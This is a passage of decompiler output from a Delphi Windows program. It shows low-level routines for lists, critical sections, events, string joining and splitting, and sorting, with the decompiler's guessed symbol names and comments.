  if ( v1 > 0 )
    return System::__linkproc__ ClassDestroy(v2);
  return result;
}
// 4058C4: using guessed type int __fastcall System::__linkproc__ ClassDestroy(_DWORD);
// 40591C: using guessed type __int64 System::__linkproc__ BeforeDestruction(void);

//----- (00427F40) --------------------------------------------------------
int __fastcall sub_427F40(_DWORD *a1, int a2)
{
  int v4; // esi

  v4 = a1[2];
  if ( v4 == a1[3] )
    (*(void (__fastcall **)(_DWORD *))*a1)(a1);
  *(_DWORD *)(a1[1] + 4 * v4) = a2;
  ++a1[2];
  if ( a2 && (int (**)())*a1 != cls_CrossPlatform_TList )
    (*(void (__fastcall **)(_DWORD *, int, _DWORD))(*a1 + 4))(a1, a2, 0);
  return v4;
}
// 42296C: using guessed type int (*cls_CrossPlatform_TList[2])();

//----- (00427F90) --------------------------------------------------------
int __fastcall sub_427F90(Idthreadcomponent::TIdThreadComponent *this)
{
  sub_4281C0((int)this, 0);
  return sub_428180((int)this, 0);
}

//----- (00427FB0) --------------------------------------------------------
int *__fastcall sub_427FB0(Idthreadcomponent::TIdThreadComponent *this, unsigned int System::AnsiString)
{
  int *result; // eax
  int v5; // [esp+8h] [ebp-4h]

  if ( *((_DWORD *)this + 2) <= System::AnsiString )
    Idthreadcomponent::TIdThreadComponent::SetThreadName(this, System::AnsiString);
  result = (int *)(*((_DWORD *)this + 1) + 4 * System::AnsiString);
  v5 = *result;
  if ( (int)(--*((_DWORD *)this + 2) - System::AnsiString) > 0 )
    result = (int *)System::Move(result + 1, result, 4 * (*((_DWORD *)this + 2) - System::AnsiString));
  if ( v5 )
  {
    result = *(int **)this;
    if ( *(int (***)())this != cls_CrossPlatform_TList )
      return (int *)(*(int (__fastcall **)(Idthreadcomponent::TIdThreadComponent *, int, char))(*(_DWORD *)this + 4))(
                      this,
                      v5,
                      2);
  }
  return result;
}
// 42296C: using guessed type int (*cls_CrossPlatform_TList[2])();

//----- (00428020) --------------------------------------------------------
int __usercall sub_428020@<eax>(int a1@<edx>, int a2@<ecx>, int a3@<edi>)
{
  int v5; // eax
  int v7; // [esp+8h] [ebp-8h] BYREF
  char v8; // [esp+Ch] [ebp-4h]
  int savedregs; // [esp+10h] [ebp+0h] BYREF

  v7 = a2;
  v8 = 0;
  v5 = Sysutils::Exception::Exception(0, &v7);
  return sub_406340(v5, a1, (int)&savedregs, a3, a2);
}
// 41A780: using guessed type _DWORD __stdcall Sysutils::Exception::Exception(_DWORD, _DWORD);

//----- (00428060) --------------------------------------------------------
int __fastcall sub_428060(Idthreadcomponent::TIdThreadComponent *this, unsigned int System::AnsiString)
{
  if ( *((_DWORD *)this + 2) <= System::AnsiString )
    Idthreadcomponent::TIdThreadComponent::SetThreadName(this, System::AnsiString);
  return *(_DWORD *)(*((_DWORD *)this + 1) + 4 * System::AnsiString);
}

//----- (00428090) --------------------------------------------------------
int __fastcall sub_428090(int a1)
{
  int v1; // edx
  int v2; // ecx

  v1 = *(_DWORD *)(a1 + 12);
  if ( v1 <= 64 )
  {
    if ( v1 <= 8 )
      v2 = 4;
    else
      v2 = 16;
  }
  else
  {
    v2 = *(int *)(a1 + 12) >> 2;
  }
  return sub_428180(a1, v1 + v2);
}
// 42809F: conditional instruction was optimized away because edx.4>=41

//----- (004280D0) --------------------------------------------------------
int __fastcall sub_4280D0(int a1, int a2)
{
  _DWORD *v2; // ecx
  int v3; // eax
  int v4; // eax
  int v5; // esi

  v2 = *(_DWORD **)(a1 + 4);
  v3 = *(_DWORD *)(a1 + 8) - 1;
  if ( v3 < 0 )
    return -1;
  v4 = v3 + 1;
  v5 = 0;
  while ( a2 != *v2 )
  {
    ++v2;
    ++v5;
    if ( !--v4 )
      return -1;
  }
  return v5;
}

//----- (00428100) --------------------------------------------------------
int __fastcall sub_428100(int a1, int a2, char a3)
{
  int result; // eax
  int v4; // ebx
  _DWORD *v5; // ecx
  int v6; // ebx

  if ( !a3 )
    return sub_4280D0(a1, a2);
  v4 = *(_DWORD *)(a1 + 8);
  if ( v4 <= 0 )
    return -1;
  v5 = (_DWORD *)(*(_DWORD *)(a1 + 4) + 4 * v4 - 4);
  v6 = v4 - 1;
  if ( v6 < 0 )
    return -1;
  result = v6;
  while ( a2 != *v5 )
  {
    --v5;
    if ( --result == -1 )
      return -1;
  }
  return result;
}

//----- (00428150) --------------------------------------------------------
int __fastcall sub_428150(Idthreadcomponent::TIdThreadComponent *this, int a2, char a3)
{
  int v4; // eax
  int v5; // esi

  v4 = sub_428100((int)this, a2, a3);
  v5 = v4;
  if ( v4 >= 0 )
    sub_427FB0(this, v4);
  return v5;
}

//----- (00428180) --------------------------------------------------------
int __fastcall sub_428180(int result, int a2)
{
  int v3; // ebx

  v3 = result;
  if ( a2 < *(_DWORD *)(result + 8) )
    result = sub_427E50(result, a2);
  if ( a2 != *(_DWORD *)(v3 + 12) )
  {
    result = System::__linkproc__ DynArraySetLength(a2);
    *(_DWORD *)(v3 + 12) = a2;
  }
  return result;
}
// 408A10: using guessed type int __cdecl System::__linkproc__ DynArraySetLength(_DWORD);
// 427E50: using guessed type int __fastcall sub_427E50(_DWORD, _DWORD);

//----- (004281C0) --------------------------------------------------------
int __fastcall sub_4281C0(int this, int System::AnsiString)
{
  _DWORD *v3; // ebx
  int v4; // ecx
  int v5; // [esp+Ch] [ebp-8h]
  int v6; // [esp+10h] [ebp-4h]

  v3 = (_DWORD *)this;
  if ( System::AnsiString < 0 )
    this = Idthreadcomponent::TIdThreadComponent::SetThreadName(
             (Idthreadcomponent::TIdThreadComponent *)this,
             System::AnsiString);
  if ( System::AnsiString != v3[2] )
  {
    if ( System::AnsiString > v3[3] )
      sub_428180((int)v3, System::AnsiString);
    this = v3[2];
    if ( System::AnsiString <= this )
    {
      v4 = *v3;
      if ( (int (**)())*v3 != cls_CrossPlatform_TList && System::AnsiString <= --this )
      {
        v5 = System::AnsiString - this - 1;
        v6 = this;
        do
        {
          --v3[2];
          this = *(_DWORD *)(v3[1] + 4 * v6);
          if ( this )
          {
            LOBYTE(v4) = 2;
            this = (*(int (__fastcall **)(_DWORD *, _DWORD, int))(*v3 + 4))(v3, *(_DWORD *)(v3[1] + 4 * v6), v4);
          }
          --v6;
          ++v5;
        }
        while ( v5 );
      }
    }
    else
    {
      this = sub_4051B8((_WORD *)(v3[1] + 4 * this), 4 * (System::AnsiString - this), 0);
    }
    v3[2] = System::AnsiString;
  }
  return this;
}
// 42823D: variable 'v4' is possibly undefined
// 42296C: using guessed type int (*cls_CrossPlatform_TList[2])();

//----- (00428270) --------------------------------------------------------
int __fastcall sub_428270(int result)
{
  _DWORD *v1; // esi
  int v2; // ebx

  v1 = (_DWORD *)result;
  v2 = *(_DWORD *)(result + 8);
  if ( v2 )
  {
    do
    {
      --v2;
      sub_405598(*(_DWORD **)(v1[1] + 4 * v2));
    }
    while ( v2 );
    return (*(int (__fastcall **)(_DWORD *))(*v1 + 8))(v1);
  }
  return result;
}

//----- (004282A0) --------------------------------------------------------
int __fastcall sub_4282A0(int a1, char a2)
{
  char v2; // bl
  int v3; // esi

  if ( a2 )
    a1 = System::__linkproc__ ClassCreate();
  v2 = a2;
  v3 = a1;
  sub_405568(a1, 0);
  *(_DWORD *)(v3 + 8) = sub_428540((int)cls_CrossPlatform_TCriticalSection, 1);
  *(_DWORD *)(v3 + 4) = sub_405568((int)cls_CrossPlatform_TList, 1);
  *(_BYTE *)(v3 + 12) = 0;
  if ( v2 )
    System::__linkproc__ AfterConstruction(v3);
  return v3;
}
// 4282B1: variable 'a2' is possibly undefined
// 4058CC: using guessed type int __fastcall System::__linkproc__ AfterConstruction(_DWORD);
// 42296C: using guessed type int (*cls_CrossPlatform_TList[2])();
// 4231F0: using guessed type int (*cls_CrossPlatform_TCriticalSection[3])();

//----- (00428380) --------------------------------------------------------
int __fastcall sub_428380(int a1)
{
  sub_4285F0(*(int (__fastcall ****)(_DWORD))(a1 + 8));
  return *(_DWORD *)(a1 + 4);
}

//----- (004283A0) --------------------------------------------------------
int __fastcall sub_4283A0(int a1)
{
  return (*(int (__fastcall **)(int, int))(*(_DWORD *)a1 + 8))(a1, -1);
}

//----- (004283C0) --------------------------------------------------------
char sub_4283C0()
{
  return 3;
}

//----- (004283D0) --------------------------------------------------------
int sub_4283D0()
{
  __int64 v0; // rax
  char v1; // bl
  int v2; // esi
  int result; // eax

  v0 = System::__linkproc__ BeforeDestruction();
  v1 = BYTE4(v0);
  v2 = v0;
  CloseHandle_0(*(HANDLE *)(v0 + 4));
  result = sub_405588();
  if ( v1 > 0 )
    return System::__linkproc__ ClassDestroy(v2);
  return result;
}
// 4058C4: using guessed type int __fastcall System::__linkproc__ ClassDestroy(_DWORD);
// 40591C: using guessed type __int64 System::__linkproc__ BeforeDestruction(void);

//----- (00428410) --------------------------------------------------------
int __usercall sub_428410@<eax>(int a1@<eax>, DWORD dwMilliseconds@<edx>, int a3@<ebx>)
{
  DWORD v4; // eax
  DWORD v5; // eax
  DWORD v6; // eax

  v4 = WaitForMultipleObjectsEx(1u, (const HANDLE *)(a1 + 4), -1, dwMilliseconds, 0) + 1;
  if ( v4 )
  {
    v5 = v4 - 1;
    if ( v5 )
    {
      v6 = v5 - 128;
      if ( v6 )
      {
        if ( v6 == 130 )
          LOBYTE(a3) = 1;
        else
          LOBYTE(a3) = 3;
      }
      else
      {
        LOBYTE(a3) = 2;
      }
    }
    else
    {
      return 0;
    }
  }
  else
  {
    LOBYTE(a3) = 3;
    *(_DWORD *)(a1 + 8) = GetLastError_1();
  }
  return a3;
}

//----- (004284D0) --------------------------------------------------------
int __fastcall sub_4284D0(int a1, char a2)
{
  char v2; // bl
  int v3; // esi

  if ( a2 )
    a1 = System::__linkproc__ ClassCreate();
  v2 = a2;
  v3 = a1;
  Teengine::TChartValueList::TChartValueList(a1, 0, 0, 1, 0, 0);
  if ( v2 )
    System::__linkproc__ AfterConstruction(v3);
  return v3;
}
// 4284E1: variable 'a2' is possibly undefined
// 4058CC: using guessed type int __fastcall System::__linkproc__ AfterConstruction(_DWORD);

//----- (00428520) --------------------------------------------------------
BOOL __fastcall sub_428520(int a1)
{
  return SetEvent(*(HANDLE *)(a1 + 4));
}

//----- (00428530) --------------------------------------------------------
BOOL __fastcall sub_428530(int a1)
{
  return ResetEvent(*(HANDLE *)(a1 + 4));
}

//----- (00428540) --------------------------------------------------------
int __fastcall sub_428540(int a1, char a2)
{
  char v2; // bl
  int v3; // esi

  if ( a2 )
    a1 = System::__linkproc__ ClassCreate();
  v2 = a2;
  v3 = a1;
  sub_405568(a1, 0);
  InitializeCriticalSection_0((LPCRITICAL_SECTION)(v3 + 4));
  if ( v2 )
    System::__linkproc__ AfterConstruction(v3);
  return v3;
}
// 428551: variable 'a2' is possibly undefined
// 4058CC: using guessed type int __fastcall System::__linkproc__ AfterConstruction(_DWORD);

//----- (00428590) --------------------------------------------------------
int sub_428590()
{
  __int64 v0; // rax
  char v1; // bl
  int v2; // esi
  int result; // eax

  v0 = System::__linkproc__ BeforeDestruction();
  v1 = BYTE4(v0);
  v2 = v0;
  DeleteCriticalSection_0((LPCRITICAL_SECTION)(v0 + 4));
  result = sub_405588();
  if ( v1 > 0 )
    return System::__linkproc__ ClassDestroy(v2);
  return result;
}
// 4058C4: using guessed type int __fastcall System::__linkproc__ ClassDestroy(_DWORD);
// 40591C: using guessed type __int64 System::__linkproc__ BeforeDestruction(void);

//----- (004285D0) --------------------------------------------------------
void __fastcall sub_4285D0(int a1)
{
  EnterCriticalSection_0((LPCRITICAL_SECTION)(a1 + 4));
}

//----- (004285E0) --------------------------------------------------------
void __fastcall sub_4285E0(int a1)
{
  LeaveCriticalSection_0((LPCRITICAL_SECTION)(a1 + 4));
}

//----- (004285F0) --------------------------------------------------------
int __fastcall sub_4285F0(int (__fastcall ***a1)(_DWORD))
{
  return (**a1)(a1);
}

//----- (00428600) --------------------------------------------------------
int __fastcall sub_428600(int a1)
{
  return (*(int (__fastcall **)(int))(*(_DWORD *)a1 + 4))(a1);
}

//----- (00428610) --------------------------------------------------------
int sub_428610()
{
  __int64 v0; // rax
  char v1; // bl
  int v2; // esi
  int result; // eax
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-30h] BYREF
  void *v5; // [esp-8h] [ebp-2Ch]
  int *v6; // [esp-4h] [ebp-28h]
  __int64 v7; // [esp+Ch] [ebp-18h]
  __int64 v8; // [esp+14h] [ebp-10h]
  __int64 v9; // [esp+1Ch] [ebp-8h] BYREF
  int savedregs; // [esp+24h] [ebp+0h] BYREF

  v0 = System::__linkproc__ BeforeDestruction();
  v1 = BYTE4(v0);
  v2 = v0;
  v6 = &savedregs;
  v5 = &loc_4286AB;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  if ( *(_DWORD *)(v0 + 4) != dword_4667E0 )
  {
    v7 = dword_466834(ExceptionList, v5, v6);
    v9 = v7;
    CloseHandle_0(*(HANDLE *)(v2 + 4));
    v8 = sub_423850(&v9);
    if ( qword_466820 < v8 )
      qword_466820 = v8;
  }
  sub_405588();
  result = 0;
  __writefsdword(0, (unsigned int)ExceptionList);
  if ( v1 > 0 )
    return System::__linkproc__ ClassDestroy(v2);
  return result;
}
// 4058C4: using guessed type int __fastcall System::__linkproc__ ClassDestroy(_DWORD);
// 40591C: using guessed type __int64 System::__linkproc__ BeforeDestruction(void);
// 4667E0: using guessed type int dword_4667E0;
// 466820: using guessed type __int64 qword_466820;
// 466834: using guessed type __int64 (__cdecl *dword_466834)(_DWORD, _DWORD, _DWORD);

//----- (004286D0) --------------------------------------------------------
_DWORD *__fastcall sub_4286D0(int a1, void *a2, int a3)
{
  int v3; // edx
  void *v4; // eax
  int v5; // ebx
  int v6; // esi
  int v7; // eax
  int v8; // ebx
  int v9; // esi
  void *v10; // eax
  void *v11; // edi
  unsigned int v13[2]; // [esp-Ch] [ebp-34h] BYREF
  int *v14; // [esp-4h] [ebp-2Ch]
  void *v15; // [esp+Ch] [ebp-1Ch]
  int v16; // [esp+10h] [ebp-18h]
  int v17; // [esp+14h] [ebp-14h]
  int v18; // [esp+18h] [ebp-10h]
  void *v19; // [esp+1Ch] [ebp-Ch]
  int v20; // [esp+20h] [ebp-8h]
  void *v21; // [esp+24h] [ebp-4h] BYREF
  int savedregs; // [esp+28h] [ebp+0h] BYREF

  v21 = 0;
  v18 = a3;
  v19 = a2;
  v20 = a1;
  v14 = &savedregs;
  v13[1] = (unsigned int)&loc_4287D8;
  v13[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v13);
  v3 = 0;
  v17 = *(_DWORD *)(a1 + 8);
  v4 = v19;
  if ( v19 )
    v4 = (void *)*((_DWORD *)v19 - 1);
  v16 = (int)v4;
  if ( --v17 >= 0 )
  {
    v5 = v17 + 1;
    v6 = 0;
    do
    {
      v7 = *(_DWORD *)(*(_DWORD *)(v20 + 4) + 8 * v6);
      if ( v7 )
        v7 = *(_DWORD *)(v7 - 4);
      v3 += v16 + v7;
      ++v6;
      --v5;
    }
    while ( v5 );
  }
  if ( v3 > 0 && v16 > 0 )
    v3 -= v16;
  sub_406D90((_DWORD *)v18, 0, v3);
  v15 = *(void **)v18;
  if ( v17 >= 0 )
  {
    v8 = v17 + 1;
    v9 = 0;
    do
    {
      sub_407030((volatile __int32 *)&v21, *(_DWORD *)(*(_DWORD *)(v20 + 4) + 8 * v9));
      v10 = v21;
      if ( v21 )
        v10 = (void *)*((_DWORD *)v21 - 1);
      v11 = v10;
      if ( v10 )
      {
        System::Move(v21, v15, 2 * (_DWORD)v10);
        v15 = (char *)v15 + 2 * (_DWORD)v11;
      }
      if ( v16 )
      {
        if ( v9 == v17 )
          break;
        System::Move(v19, v15, 2 * v16);
        v15 = (char *)v15 + 2 * v16;
      }
      ++v9;
      --v8;
    }
    while ( v8 );
  }
  __writefsdword(0, v13[0]);
  v14 = (int *)&loc_4287DF;
  return sub_406C44(&v21);
}

//----- (004287F0) --------------------------------------------------------
int __fastcall sub_4287F0(int a1, unsigned __int16 *a2, unsigned __int16 *a3)
{
  unsigned __int16 *v3; // eax
  unsigned __int16 *v4; // esi
  int v5; // edx
  int v6; // eax
  int v7; // edx
  int v8; // edi
  int v9; // ecx
  int v10; // ebx
  int v11; // ebx
  int v13; // [esp+0h] [ebp-10h]

  v3 = a2;
  v4 = a3;
  if ( a3 == a2 )
    return 0;
  if ( a2 )
  {
    if ( a3 )
    {
      v13 = *((_DWORD *)a2 - 1);
      v7 = *((_DWORD *)a3 - 1);
      v8 = v7;
      v9 = v13;
      if ( v7 < v13 )
        v9 = v7;
      if ( v9 <= 0 )
      {
        return v13 - v8;
      }
      else
      {
        while ( 1 )
        {
          v10 = *v4;
          v5 = *v3 - v10;
          if ( *v3 != v10 )
            break;
          if ( v9 == 1 )
            return v13 - v8;
          v11 = v4[1];
          v5 = v3[1] - v11;
          if ( v3[1] != v11 )
            break;
          v4 += 2;
          v3 += 2;
          v9 -= 2;
          if ( v9 <= 0 )
            return v13 - v8;
        }
      }
    }
    else
    {
      return *((_DWORD *)a2 - 1);
    }
  }
  else
  {
    v6 = (int)a3;
    if ( a3 )
      v6 = *((_DWORD *)a3 - 1);
    return -v6;
  }
  return v5;
}
// 42881D: conditional instruction was optimized away because edx.4!=0
// 42882A: conditional instruction was optimized away because edx.4!=0
// 428838: conditional instruction was optimized away because ecx.4!=0

//----- (00428890) --------------------------------------------------------
_DWORD *__fastcall sub_428890(_DWORD *a1, int a2, __int16 a3)
{
  _WORD *v4; // edi
  _WORD *i; // ebx
  __int16 v6; // si
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-2Ch] BYREF
  void *v9; // [esp-8h] [ebp-28h]
  int *v10; // [esp-4h] [ebp-24h]
  void *v11; // [esp+0h] [ebp-20h]
  int v12; // [esp+Ch] [ebp-14h]
  int v13; // [esp+10h] [ebp-10h]
  __int16 v14; // [esp+16h] [ebp-Ah]
  _DWORD *v15; // [esp+18h] [ebp-8h]
  int v16; // [esp+1Ch] [ebp-4h] BYREF
  int savedregs; // [esp+20h] [ebp+0h] BYREF

  v16 = 0;
  v14 = a3;
  v15 = a1;
  v10 = &savedregs;
  v9 = &loc_428983;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  (*(void (__fastcall **)(_DWORD *, _DWORD))(*a1 + 4))(a1, *a1);
  v4 = (_WORD *)sub_407790(a2);
  while ( *v4 )
  {
    for ( i = v4; ; ++i )
    {
      v6 = *i;
      if ( !*i || v6 == 10 || v6 == 13 || v6 == 11 || v6 == 12 || v6 == 8232 || v6 == 8233 || v6 == v14 )
        break;
    }
    sub_406D90(&v16, v4, i - v4);
    v13 = sub_429140((int)v15, v16, 0, (int)v4);
    v4 = i;
    if ( *i )
    {
      v4 = i + 1;
      if ( *i == 13 && *v4 == 10 )
        v4 = i + 2;
      if ( *((_BYTE *)v15 + 22) && !*v4 )
        v12 = sub_429140((int)v15, 0, 0, (int)v4);
    }
  }
  __writefsdword(0, (unsigned int)v9);
  v11 = &loc_42898A;
  return sub_406C44(&v16);
}

//----- (004289A0) --------------------------------------------------------
_DWORD *__fastcall sub_4289A0(int a1, int a2)
{
  return sub_4286D0(a1, L"\r\n", a2);
}
// 4289C8: using guessed type wchar_t asc_4289C8[3];

//----- (004289D0) --------------------------------------------------------
_DWORD *__fastcall sub_4289D0(_DWORD *a1, int a2)
{
  return sub_428890(a1, a2, 13);
}

//----- (004289E0) --------------------------------------------------------
int __fastcall sub_4289E0(int a1)
{
  int result; // eax

  result = nullsub_2(a1);
  *(_WORD *)(a1 + 20) = 61;
  return result;
}
// 405840: using guessed type int __fastcall nullsub_2(_DWORD);

//----- (00428A10) --------------------------------------------------------
int __fastcall sub_428A10(int a1, char a2, int a3, int a4)
{
  char v4; // bl
  int v5; // esi

  if ( a2 )
    a1 = System::__linkproc__ ClassCreate();
  v4 = a2;
  v5 = a1;
  *(_DWORD *)(a1 + 28) = a3;
  *(_DWORD *)(a1 + 24) = a4;
  sub_405568(a1, 0);
  if ( v4 )
    System::__linkproc__ AfterConstruction(v5);
  return v5;
}
// 428A21: variable 'a2' is possibly undefined
// 428A25: variable 'a3' is possibly undefined
// 4058CC: using guessed type int __fastcall System::__linkproc__ AfterConstruction(_DWORD);

//----- (00428A60) --------------------------------------------------------
bool __fastcall sub_428A60(int a1)
{
  return *(_DWORD *)(a1 + 4) == 0;
}

//----- (00428A70) --------------------------------------------------------
int __fastcall sub_428A70(_DWORD *a1)
{
  _DWORD *v2; // edi
  _DWORD *v3; // edi
  int result; // eax

  while ( 1 )
  {
    v2 = (_DWORD *)a1[1];
    if ( !v2 )
      break;
    a1[1] = v2[1];
    sub_405598(v2);
  }
  a1[3] = 0;
  a1[2] = 0;
  while ( 1 )
  {
    v3 = (_DWORD *)a1[4];
    if ( !v3 )
      break;
    a1[4] = v3[1];
    sub_405598(v3);
  }
  result = 0;
  a1[5] = 0;
  return result;
}

//----- (00428AC0) --------------------------------------------------------
int sub_428AC0()
{
  __int64 v0; // rax
  char v1; // bl
  int v2; // esi
  int result; // eax

  v0 = System::__linkproc__ BeforeDestruction();
  v1 = BYTE4(v0);
  v2 = v0;
  sub_428A70((_DWORD *)v0);
  result = sub_405588();
  if ( v1 > 0 )
    return System::__linkproc__ ClassDestroy(v2);
  return result;
}
// 4058C4: using guessed type int __fastcall System::__linkproc__ ClassDestroy(_DWORD);
// 40591C: using guessed type __int64 System::__linkproc__ BeforeDestruction(void);

//----- (00428AF0) --------------------------------------------------------
void (__fastcall ***__fastcall sub_428AF0(_DWORD *a1))(_DWORD)
{
  int v1; // edx
  void (__fastcall ***v2)(_DWORD); // ebx

  v1 = a1[4];
  if ( v1 )
  {
    v2 = (void (__fastcall ***)(_DWORD))a1[4];
    a1[4] = *(_DWORD *)(v1 + 4);
    --a1[5];
  }
  else
  {
    v2 = (void (__fastcall ***)(_DWORD))sub_405568(a1[7], 1);
    (**v2)(v2);
  }
  return v2;
}

//----- (00428B20) --------------------------------------------------------
void (**__fastcall sub_428B20(_DWORD *a1, void (***a2)(void)))(void)
{
  void (**result)(void); // eax

  if ( a1[5] >= a1[6] )
    return (void (**)(void))sub_405598(a2);
  (**a2)();
  result = (void (**)(void))a1[4];
  a2[1] = result;
  a1[4] = a2;
  ++a1[5];
  return result;
}

//----- (00428B50) --------------------------------------------------------
_DWORD *__fastcall sub_428B50(_DWORD *result, int a2)
{
  int v2; // ecx

  *(_DWORD *)(a2 + 4) = 0;
  v2 = result[2];
  if ( v2 )
    *(_DWORD *)(v2 + 4) = a2;
  else
    result[1] = a2;
  result[2] = a2;
  ++result[3];
  return result;
}

//----- (00428B70) --------------------------------------------------------
bool __fastcall sub_428B70(_DWORD *a1)
{
  _DWORD *v2; // eax
  bool result; // al

  while ( 1 )
  {
    result = sub_428A60((int)a1);
    if ( result )
      break;
    v2 = (_DWORD *)sub_428BA0(a1);
    if ( v2 )
      sub_405598(v2);
  }
  return result;
}

//----- (00428BA0) --------------------------------------------------------
int __fastcall sub_428BA0(_DWORD *a1)
{
  int v1; // ecx
  int v2; // ebx
  int v3; // ebx

  v1 = a1[1];
  if ( v1 )
  {
    v2 = *(_DWORD *)(v1 + 4);
    a1[1] = v2;
    if ( !v2 )
      a1[2] = 0;
    --a1[3];
  }
  if ( !v1 )
    return 0;
  v3 = *(_DWORD *)(v1 + 8);
  sub_428B20(a1, (void (***)(void))v1);
  return v3;
}

//----- (00428BE0) --------------------------------------------------------
_DWORD *__fastcall sub_428BE0(_DWORD *a1, void (__fastcall **a2)(_DWORD))
{
  void (__fastcall ***v4)(_DWORD); // edx
  _DWORD *result; // eax
  int v6; // ecx

  v4 = sub_428AF0(a1);
  v4[2] = a2;
  result = a1;
  v4[1] = 0;
  v6 = a1[2];
  if ( v6 )
    *(_DWORD *)(v6 + 4) = v4;
  else
    a1[1] = v4;
  a1[2] = v4;
  ++a1[3];
  return result;
}

//----- (00428C20) --------------------------------------------------------
int __fastcall sub_428C20(int a1)
{
  int result; // eax

  sub_406C44((_DWORD *)a1);
  sub_406C44((_DWORD *)(a1 + 4));
  *(_DWORD *)(a1 + 8) = -1;
  sub_408B34((_DWORD *)(a1 + 12), (int)&byte_4224D0);
  *(_WORD *)(a1 + 16) = 1;
  sub_406C44((_DWORD *)(a1 + 20));
  *(_BYTE *)(a1 + 24) = 0;
  sub_406C68((_DWORD *)(a1 + 28));
  sub_406C68((_DWORD *)(a1 + 32));
  *(_DWORD *)(a1 + 40) = 0;
  *(_DWORD *)(a1 + 44) = 0;
  *(_BYTE *)(a1 + 48) = 0;
  *(_BYTE *)(a1 + 49) = 0;
  *(_DWORD *)(a1 + 52) = 0;
  *(_BYTE *)(a1 + 56) = 1;
  result = 0;
  *(_DWORD *)(a1 + 60) = 0;
  return result;
}
// 4224D0: using guessed type char byte_4224D0;

//----- (00428C90) --------------------------------------------------------
bool __fastcall sub_428C90(_QWORD *a1)
{
  return *a1 == 0i64;
}

//----- (00428CA0) --------------------------------------------------------
__int64 __fastcall sub_428CA0(_QWORD *a1, _QWORD *a2)
{
  return *a1 - *a2;
}

//----- (00428CD0) --------------------------------------------------------
int sub_428CD0()
{
  int result; // eax
  unsigned int v1[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v1[2] = (unsigned int)&savedregs;
  v1[1] = (unsigned int)&loc_428D15;
  v1[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v1);
  if ( !++dword_46E95C )
  {
    sub_406C44(&dword_466914);
    sub_406C44(&dword_466918);
    sub_406C44(&dword_466920);
  }
  result = 0;
  __writefsdword(0, v1[0]);
  return result;
}
// 466914: using guessed type int dword_466914;
// 466918: using guessed type int dword_466918;
// 466920: using guessed type int dword_466920;
// 46E95C: using guessed type int dword_46E95C;

//----- (00428D20) --------------------------------------------------------
int __usercall sub_428D20@<eax>(int a1@<edx>, int a2@<ecx>, int a3@<edi>)
{
  int v5; // eax
  int v7; // [esp+8h] [ebp-8h] BYREF
  char v8; // [esp+Ch] [ebp-4h]
  int savedregs; // [esp+10h] [ebp+0h] BYREF

  v7 = a2;
  v8 = 0;
  v5 = Sysutils::Exception::Exception(0, &v7);
  return sub_406340(v5, a1, (int)&savedregs, a3, a2);
}
// 41A780: using guessed type _DWORD __stdcall Sysutils::Exception::Exception(_DWORD, _DWORD);

//----- (00428E60) --------------------------------------------------------
volatile __int32 *__fastcall sub_428E60(
        Idthreadcomponent::TIdThreadComponent *this,
        unsigned int System::AnsiString,
        volatile __int32 *a3)
{
  if ( *((_DWORD *)this + 2) <= System::AnsiString )
    Idthreadcomponent::TIdThreadComponent::SetThreadName(this, System::AnsiString);
  return sub_406FE8(a3, *(_DWORD *)(*((_DWORD *)this + 1) + 8 * System::AnsiString));
}

//----- (00428E90) --------------------------------------------------------
int __fastcall sub_428E90(Idthreadcomponent::TIdThreadComponent *this, unsigned int System::AnsiString)
{
  if ( *((_DWORD *)this + 2) <= System::AnsiString )
    Idthreadcomponent::TIdThreadComponent::SetThreadName(this, System::AnsiString);
  return *(_DWORD *)(*((_DWORD *)this + 1) + 8 * System::AnsiString + 4);
}

//----- (00428EC0) --------------------------------------------------------
int __fastcall sub_428EC0(int a1, int a2, int a3)
{
  int result; // eax
  _DWORD *v5; // esi
  int v6; // eax
  _DWORD *i; // esi
  int v8; // eax
  int v9; // eax
  _DWORD *v10; // [esp+Ch] [ebp-1Ch]
  _DWORD *j; // [esp+Ch] [ebp-1Ch]
  _DWORD *v12; // [esp+10h] [ebp-18h]
  unsigned int v13; // [esp+14h] [ebp-14h]
  signed int v14; // [esp+18h] [ebp-10h]
  signed int v15; // [esp+1Ch] [ebp-Ch]
  signed int v16; // [esp+20h] [ebp-8h]
  int v17; // [esp+24h] [ebp-4h]

  v16 = a3;
  v17 = a2;
  result = a2;
  if ( a2 < a3 )
  {
    while ( v16 - v17 != 1 )
    {
      v15 = v17;
      v14 = v16;
      v13 = (unsigned int)(v16 + v17) >> 1;
      do
      {
        v12 = (_DWORD *)(*(_DWORD *)(a1 + 4) + 8 * v13);
        for ( i = (_DWORD *)(*(_DWORD *)(a1 + 4) + 8 * v15);
              (**(int (__fastcall ***)(int, _DWORD, _DWORD))a1)(a1, *i, *v12) < 0;
              i += 2 )
        {
          ++v15;
        }
        for ( j = (_DWORD *)(*(_DWORD *)(a1 + 4) + 8 * v14);
              (**(int (__fastcall ***)(int, _DWORD, _DWORD))a1)(a1, *j, *v12) > 0;
              j -= 2 )
        {
          --v14;
        }
        if ( v15 <= v14 )
        {
          if ( i != j )
          {
            v8 = *i;
            *i = *j;
            *j = v8;
            v9 = i[1];
            i[1] = j[1];
            j[1] = v9;
          }
          if ( v13 == v15 )
          {
            v13 = v14;
          }
          else if ( v13 == v14 )
          {
            v13 = v15;
          }
          ++v15;
          --v14;
        }
      }
      while ( v15 <= v14 );
      if ( v14 - v17 <= v16 - v15 )
      {
        if ( v17 < v14 )
          sub_428EC0(a1, v17, v14);
        v17 = v15;
      }
      else
      {
        if ( v15 < v16 )
          sub_428EC0(a1, v15, v16);
        v16 = v14;
      }
      result = v17;
      if ( v17 >= v16 )
        return result;
    }
    v5 = (_DWORD *)(*(_DWORD *)(a1 + 4) + 8 * v17);
    v10 = (_DWORD *)(*(_DWORD *)(a1 + 4) + 8 * v16);
    result = (**(int (__fastcall ***)(int, _DWORD, _DWORD))a1)(a1, *v5, *v10);
    if ( result > 0 )
    {
      v6 = *v5;
      *v5 = *v10;
      *v10 = v6;
      result = v5[1];
